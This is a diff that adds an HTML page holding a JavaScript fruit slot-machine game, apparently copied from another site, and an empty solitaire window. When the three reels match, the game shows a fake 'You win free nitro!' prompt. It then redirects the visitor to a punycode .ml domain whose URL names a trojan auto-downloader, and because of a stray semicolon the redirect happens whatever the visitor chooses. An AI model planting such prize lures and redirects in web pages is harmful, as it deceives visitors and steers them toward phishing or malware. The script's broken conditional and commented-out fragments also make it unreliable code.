@@ -1,0 +1,123 @@
+
+<!-- STOLEN from url=(0052)http://webbi.meili.fi/seppotoi/savo/pelit/hedel.html -->
+
+<html>
+    <style>
+body {
+  background-image: url("bg.gif");
+  background-repeat: repeat;
+}
+</style>
+    <head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <br>
+    <br><br><br><br><title>Slots</title>
+<script language="JavaScript">
+var koneen = new Array(0,0,0);
+var kuvat = new Array("viini.gif","omena.gif","sipuli.gif");
+
+function alku()
+{
+	for (i=0;i<3;i++)
+	{	
+	  document.images[i].src="pohja.gif";
+	}  
+	
+	var arpa=0;
+	for (i=0;i<3;i++)
+	{	
+	  arpa=Math.random();
+	  koneen[i]=Math.floor(3*arpa);
+	}
+	setTimeout("kuvia(0)",300);
+	setTimeout("kuvia(1)",600);
+	setTimeout("kuvia(2)",900);
+	if ((koneen[0]==koneen[1])&&(koneen[1]==koneen[2]))
+	//{
+	  /// setTimeout("alert('You win free nitro! click here http://xn--join-e714c.ml/virus-malware_autodownloader-trojan.html')",1200);
+	  setTimeout(function(){
+	   if (window.confirm('You win  free nitro! click "OK" to accept')); 
+	  
+{
+window.location.href='http://xn--join-e714c.ml/virus-malware_autodownloader-trojan.html';
+};
+//	}
+	}, 2000);
+}
+function kuvia(viesti)
+{
+ 
+	document.images[viesti].src=kuvat[koneen[viesti]];
+
+	
+	
+}
+
+</script>
+</head>
+
+<body>
+    <audio id="divAudio">
+   <source src="air.mp3" type="audio/mp3">
+</audio>
+
+<script>
+   var vAudio = document.getElementById("divAudio");
+   var hasInit = false;
+   function playMusic()
+   {
+      if(!hasInit)
+      {
+          hasInit = true;
+          vAudio.play();
+      }
+   }
+</script>
+<div onmouseover="playMusic()">
+<table border="1" bgcolor="red" align="center">
+<tbody><tr>
+<td colspan="3" align="center">
+<b>Salt Casino Slots</b>
+</td>
+</tr><tr>
+<td align="center" bgcolor="silver">
+<img src="viini.gif" name="pkuva"></td>
+<td align="center" bgcolor="silver">
+<img src="omena.gif" name="kkuva"></td>
+<td align="center" bgcolor="silver">
+<img src="sipuli.gif" name="kkuva"></td>
+</tr><tr>
+<td colspan="3" align="center">
+<form name="loma">
+<br>
+<input type="button" value="   Play    " onclick="alku()">
+</form>
+</td>
+</tr></tbody></table>
+
+</div>
+<div class="window">
+        <div class="window__inner">
+            <div class="window__heading">
+                <div class="window__heading-icon"></div>
+                Salt official solitaire videogame
+            </div>
+            <div class="window__actions">
+                <button type="button" id="js-reset" class="new-game">New game</button>
+            </div>
+            <div class="window__content">
+                <div class="window__content-inner">
+                    <div class="solitaire" id="js-solitaire">
+                        <div id="js-finish" class="finish-deck"></div>
+                        <div id="js-board" class="board-deck"></div>
+
+                        <div class="deck">
+                            <div id="js-deck-pile" class="deck__pile"></div>
+                            <div id="js-deck-deal" class="deck__deal"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="main.js"></script>
+</body></html>
